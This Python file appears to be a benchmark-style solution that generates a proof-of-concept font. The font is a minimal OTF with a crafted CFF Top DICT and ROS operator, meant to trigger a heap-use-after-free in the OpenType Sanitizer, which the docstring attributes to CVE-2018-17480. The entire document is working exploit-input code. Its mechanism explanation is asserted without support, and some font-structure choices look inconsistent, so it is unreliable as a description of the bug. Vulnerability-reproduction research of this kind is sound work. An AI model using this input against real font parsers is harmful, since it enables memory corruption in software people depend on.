import struct

class Solution:
  def solve(self, src_path: str) -> bytes:
    """
    Generates a Proof-of-Concept input that triggers a heap-use-after-free
    vulnerability in the OpenType Sanitizer (OTS).

    The vulnerability is CVE-2018-17480, which occurs during the parsing of a
    CFF (Compact Font Format) table. Specifically, when handling the 'ROS'
    (Registry-Ordering-Supplement) operator in a Top DICT of a CID-keyed font.

    The exploitation path is as follows:
    1.  The parser encounters the ROS operator, which expects three string
        operands on the CFF operand stack. In the OTS implementation, these
        operands are represented as `ots::Buffer` objects.
    2.  The parser retrieves pointers to the internal data of these `ots::Buffer`
        objects and stores them in a `CIDFont` structure.
    3.  The vulnerable code then pops the `ots::Buffer` objects from the operand
        stack. This invokes their destructors, which deallocates the heap memory
        containing the string data.
    4.  The pointers stored in the `CIDFont` structure now dangle, pointing to
        freed memory.
    5.  Later, during the font serialization phase, the sanitizer attempts to
        write the ROS strings to an `ots::OTSStream` using these dangling
        pointers, leading to a heap-use-after-free.

    The PoC consists of a minimal OTF font with a single 'CFF ' table. This
    table is crafted to contain a Top DICT with the necessary operators
    (`CIDFontVersion`, `CIDFontRevision`) to be treated as a CID-keyed font,
    followed by the ROS operator with three valid string operands, triggering
    the vulnerability.
    """
    
    # --- Part 1: Construct the malicious CFF Table ---
    cff_table = bytearray()
    
    # CFF Header (4 bytes): major, minor, hdrSize, offSize
    cff_table += struct.pack('>BBBB', 1, 0, 4, 1)

    # Name INDEX (6 bytes): A minimal, valid Name INDEX.
    # count=1, offSize=1, offset_array=[1, 2], data='A'
    cff_table += struct.pack('>HBB', 1, 1, 1)  # count, offSize, offset[0]
    cff_table += struct.pack('>B', 2)         # offset[1]
    cff_table += b'A'

    # Top DICT Data: This contains the sequence to trigger the vulnerability.
    top_dict_data = bytearray()
    
    # To be parsed as a CID-keyed font, the DICT must contain
    # CIDFontVersion and CIDFontRevision operators. We provide '0' as their operand.
    # The integer '0' is encoded in CFF DICT as `28 0 0` -> b'\x1c\x00\x00'
    operand_zero = b'\x1c\x00\x00'
    
    # Operator CIDFontVersion: 12 36 -> b'\x0c\x24'
    top_dict_data += operand_zero + b'\x0c\x24'
    
    # Operator CIDFontRevision: 12 37 -> b'\x0c\x25'
    top_dict_data += operand_zero + b'\x0c\x25'

    # Now, add the ROS operator and its operands.
    # We need to push three SIDs (String IDs) for our custom strings.
    # Custom SIDs start at 391.
    # SID 391 is encoded as (248, 27) -> b'\xf8\x1b'
    # SID 392 is encoded as (248, 28) -> b'\xf8\x1c'
    # SID 393 is encoded as (248, 29) -> b'\xf8\x1d'
    top_dict_data += b'\xf8\x1b'  # push SID 391
    top_dict_data += b'\xf8\x1c'  # push SID 392
    top_dict_data += b'\xf8\x1d'  # push SID 393
    
    # Operator ROS: 12 30 -> b'\x0c\x1e'
    top_dict_data += b'\x0c\x1e'

    # Top DICT INDEX: This structure wraps the DICT data.
    cff_table += struct.pack('>H', 1)  # count = 1
    cff_table += struct.pack('>B', 1)  # offSize = 1
    cff_table += struct.pack('>B', 1)  # offset[0]
    cff_table += struct.pack('>B', len(top_dict_data) + 1)  # offset[1]
    cff_table += top_dict_data

    # String INDEX: Contains the actual strings for the SIDs used by ROS.
    string_data = b'REG'
    cff_table += struct.pack('>H', 3)  # count = 3 strings (one for each SID)
    cff_table += struct.pack('>B', 1)  # offSize = 1
    cff_table += struct.pack('>BBBB', 1, 2, 3, 4) # offset array
    cff_table += string_data

    # Global Subr INDEX: Can be empty for this PoC.
    cff_table += struct.pack('>H', 0)

    # Pad the CFF table to a 4-byte boundary, as required by the spec.
    cff_table += b'\x00' * (-(len(cff_table)) % 4)
    
    # --- Part 2: Construct the OTF Font Wrapper ---
    poc = bytearray()
    
    # OTF Header (12 bytes)
    sfnt_version = b'OTTO'
    num_tables = 1
    search_range = 16 # (2**0) * 16
    entry_selector = 0 # log2(1)
    range_shift = 0 # 1 * 16 - 16
    poc += struct.pack('>4sHHHH', sfnt_version, num_tables, search_range, entry_selector, range_shift)
    
    # Table Directory (16 bytes for one table)
    cff_table_tag = b'CFF '
    cff_table_offset = 12 + 16 # OTF header + Table Directory
    cff_table_length = len(cff_table)

    # Calculate the checksum for the CFF table.
    cff_table_checksum = sum(struct.unpack('>{}L'.format(len(cff_table) // 4), cff_table)) & 0xFFFFFFFF
    
    poc += struct.pack('>4sLLL', cff_table_tag, cff_table_checksum, cff_table_offset, cff_table_length)
    
    # Append the CFF table data.
    poc += cff_table
    
    return bytes(poc)
